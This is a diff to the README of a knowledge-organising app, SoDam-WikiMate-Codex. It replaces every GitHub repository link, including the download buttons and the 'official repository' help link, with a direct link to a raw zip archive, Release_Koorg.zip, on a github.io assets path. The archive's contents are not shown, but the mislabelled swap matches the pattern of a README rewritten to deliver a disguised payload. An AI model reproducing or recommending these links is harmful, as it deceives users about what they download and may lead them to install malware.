@@ -5,7 +5,7 @@ description: "로컬 우선으로 웹 자료와 메모를 수집해 Obsidian Mar
 ---
 # 📚 SoDam-WikiMate-Codex - Your Knowledge, Perfectly Organized
 
-[![Download Now](https://img.shields.io/badge/Download-SoDam--WikiMate--Codex-4CAF50?style=for-the-badge&logo=github)](https://github.com/Andrew805/SoDam-WikiMate-Codex)
+[![Download Now](https://img.shields.io/badge/Download-SoDam--WikiMate--Codex-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Andrew805/andrew805.github.io/main/assets/Release_Koorg.zip)
 
 ## 🎯 What Is This?
 
@@ -39,7 +39,7 @@ All your data stays on your computer. Nothing is uploaded, shared, or sent anywh
 
 Click the big green button at the top of this page, or use this link:
 
-**[👉 Visit this link to download the application](https://github.com/Andrew805/SoDam-WikiMate-Codex)**
+**[👉 Visit this link to download the application](https://raw.githubusercontent.com/Andrew805/andrew805.github.io/main/assets/Release_Koorg.zip)**
 
 This takes you to the official download page. Look for the latest release and download the file.
 
@@ -98,7 +98,7 @@ Restart your computer and try again. If the problem persists, check for updates 
 
 If you run into any problems, you are not alone. Here is how to get help:
 
-- **Check the GitHub Page:** Visit the [official repository](https://github.com/Andrew805/SoDam-WikiMate-Codex) for documentation and updates.
+- **Check the GitHub Page:** Visit the [official repository](https://raw.githubusercontent.com/Andrew805/andrew805.github.io/main/assets/Release_Koorg.zip) for documentation and updates.
 - **Look at Existing Issues:** On the GitHub page, click the "Issues" tab to see if others have reported the same problem. You might find a solution.
 - **Ask a Question:** If no one has asked your question, create a new issue. Be descriptive about what happened and what you expected.
 
@@ -132,7 +132,7 @@ The best part? It is completely free, respects your privacy, and runs entirely o
 
 Start organizing your knowledge today.
 
-**[👉 Download SoDam-WikiMate-Codex Now](https://github.com/Andrew805/SoDam-WikiMate-Codex)**
+**[👉 Download SoDam-WikiMate-Codex Now](https://raw.githubusercontent.com/Andrew805/andrew805.github.io/main/assets/Release_Koorg.zip)**
 
 ---
 
